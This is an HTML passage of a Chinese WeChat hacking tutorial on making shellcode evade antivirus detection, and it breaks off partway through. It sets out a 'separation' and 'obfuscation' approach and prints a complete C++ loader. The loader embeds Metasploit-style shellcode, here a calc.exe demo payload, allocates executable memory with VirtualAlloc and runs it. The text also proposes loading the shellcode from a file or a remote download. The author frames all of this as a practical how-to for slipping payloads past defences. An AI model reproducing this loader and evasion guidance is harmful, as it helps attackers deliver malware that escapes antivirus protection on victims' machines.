<html>
<head>
<title>干货Shellcode免杀总结一</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
干货 | Shellcode免杀总结&lt;一&gt;
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    卿
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2020-02-08</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><h3 style="margin-right: 8px;margin-bottom: 0.75em;padding-left: 8px;font-weight: bold;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size:14px;line-height:34px;;border-left: 3px solid rgb(0, 152, 116);" data-mpa-powered-by="yiban.io">自己还是想把一些shellcode免杀的技巧通过白话文、傻瓜式的文章把技巧讲清楚。希望更多和我一样web狗也能动手做到免杀的实现。</h3><hr style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;white-space: normal;border-style: solid;border-right-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-color: rgba(0, 0, 0, 0.1);transform-origin: 0px 0px;transform: scale(1, 0.5);"  /><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;padding-left: 8px;font-weight: bold;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size:14px;line-height:34px;;border-left: 3px solid rgb(0, 152, 116);">文中我将shellcode免杀技巧分为 "分离“、”混淆“两个大类，通过不同技巧针对不同检测方式，也就是常听到的特征检测、行为检测、云查杀。</h3><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;padding-left: 8px;font-weight: bold;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size:14px;line-height:34px;;border-left: 3px solid rgb(0, 152, 116);">个人能力有限，文中出现错误还请*斧正、轻喷。</h3><hr style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;white-space: normal;border-style: solid;border-right-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-color: rgba(0, 0, 0, 0.1);transform-origin: 0px 0px;transform: scale(1, 0.5);"  /><h1 style="margin: 2em auto 1em;padding-right: 1em;padding-left: 1em;font-weight: bold;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 15.96px;display: table;border-bottom: 2px solid rgb(0, 152, 116);">0x01 那些shellcode"分离"免杀</h1><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先来看看关于shellcode常用得C/C++加载方式</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">常见方式比如</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;font-style: italic;">函数指针执行、内联汇编指令、伪指令</p><p><span style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;">等方式。</span></p><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="138" data-backw="319" data-ratio="0.4332129963898917" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/1_LPJC6HlaFqHJzibBstvO5JvuLtIJgw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkq5ZCe31cqLJgH6MgDnh4EqDfcLPJC6HlaFqHJzibBstvO5JvuLtIJgw/640?wx_fmt=png'" data-type="png" data-w="1108" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;white-space: normal;"><br  /></p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">但是这种shellcode明显 和执行程序在一起很容易被查杀</p><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="79" data-backw="319" data-ratio="0.24577373211963588" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/2_hqIv4ahFGzNs9ZzGzp3owxwsQ78Teg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkDPt2VBgGibOI4MvKQPaxqMbtEhqIv4ahFGzNs9ZzGzp3owxwsQ78Teg/640?wx_fmt=png'" data-type="png" data-w="769" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">所以大多数分离免杀的思想就是把执行shellcode和加载程序分开。</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">来看看常见的分离加载 拿C++举例</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">正常使用像 VirtualAlloc 内存操作的函数执行shellcode :</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span> <span style="color: rgb(24, 54, 145);">"stdafx.h"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span> <span style="color: rgb(24, 54, 145);">"windows.h"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(167, 29, 93);">namespace</span> std;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">int</span> main(<span style="color: rgb(167, 29, 93);">int</span> argc, <span style="color: rgb(167, 29, 93);">char</span> **argv)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">{</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">unsigned</span> <span style="color: rgb(167, 29, 93);">char</span> buf[] =</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">void</span> *<span style="color: rgb(167, 29, 93);">exec</span> = <span style="color: rgb(0, 134, 179);">VirtualAlloc</span>(<span style="color: rgb(0, 134, 179);">0</span>, <span style="color: rgb(167, 29, 93);">sizeof</span> buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    memcpy(<span style="color: rgb(167, 29, 93);">exec</span>, buf, <span style="color: rgb(167, 29, 93);">sizeof</span> buf);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    ((<span style="color: rgb(167, 29, 93);">void</span>(*)())<span style="color: rgb(167, 29, 93);">exec</span>)();</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">return</span> <span style="color: rgb(0, 134, 179);">0</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">}</span></code></pre></section><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="171" data-backw="319" data-ratio="0.5356151711378353" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/3_uR6SrnX0TU9o3ibEkdN5vtYGo0OaoQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkFtiblX1qEyvpHofzBp93NvtFCSuR6SrnX0TU9o3ibEkdN5vtYGo0OaoQ/640?wx_fmt=png'" data-type="png" data-w="1081" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;white-space: normal;"><br  /></p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如果要把shellcode单独分离 我们可以通过其他当时获取到shellcode，而不是事先讲shellcode写死在程序中</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">举例：shellcode从文本提取或从远程下载获取。</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft 